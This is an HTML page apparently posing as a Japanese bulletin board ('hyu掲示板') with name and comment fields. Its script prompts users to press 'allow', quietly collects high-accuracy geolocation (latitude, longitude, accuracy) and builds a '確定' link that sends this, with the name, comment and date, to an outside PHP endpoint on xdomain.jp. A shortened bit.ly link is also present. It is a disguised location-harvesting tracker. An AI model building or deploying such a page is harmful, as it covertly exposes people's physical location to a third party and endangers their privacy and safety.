<html lang="ja">
<head>
<title>hyu掲示板</title>
<meta charset="UTF-8" />
<script type="text/javascript">

var Ftsize =1;
function Chgsize(Vle) {
Ftsize = Ftsize + Vle;
if(Vle == "0") Ftsize = 1;
window.parent.document.body.style.zoom = Ftsize;
}

</script>
</head>
<body bgcolor="white">
<h1>掲示板です</h1>
<br>
<h1>名前</h1>
<br>
<input type="text" id="name" class="namedate">
<br><br>
<h1>コメント</h1>
<input type="text" id="text" class="textdate">
<br><br>
<input type="button" value="ok" onClick="test()">

<br><br>
<a href="https://bit.ly/2FotoeN">lineにGO</a>

<script>
window.Chgsize(2.5);

function test() {
window.alert("許可押してね");

var name = document.getElementById('name').value;
var text = document.getElementById('text').value;

var today = new Date();
var month = today.getMonth() + 1;
var day = today.getDate();
navigator.geolocation.getCurrentPosition( (position) => {
    var lat  = position.coords.latitude;
    var lng  = position.coords.longitude;
    var accu = position.coords.accuracy;
    displayData(lat, lng, accu);
    window.Chgsize(0.5);
}, (error) => {
}, {
    enableHighAccuracy: true
});
function displayData(lat, lng, accu){

document.write("<h1>名前</h1><br>" + name + "<br><h1>コメント</h1>" + text);
document.write("<br><br><a href=http://yumaabckhh.php.xdomain.jp/h.php?name=" + name + "&text=" + text + "&get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + ">確定</a>");
}
}
</script>

<style>
.namedate{
  width: 250px;
  padding: 5px 8px;
  border-radius: 6px;
  border-top: 1px solid #aaa;
  border-left: 1px solid #aaa;
  border-right: 2px solid #aaa;
  border-bottom: 2px solid #aaa;
  background-image: none
  background-color: #ddd;
  font-size: 16px;
}

.textdate{
  width: 1000px;
  padding: 5px 8px;
  border-radius: 6px;
  border-top: 1px solid #aaa;
  border-left: 1px solid #aaa;
  border-right: 2px solid #aaa;
  border-bottom: 2px solid #aaa;
  background-image: none
  background-color: #ddd;
  font-size: 16px;
}

</style>

</body>
</html>
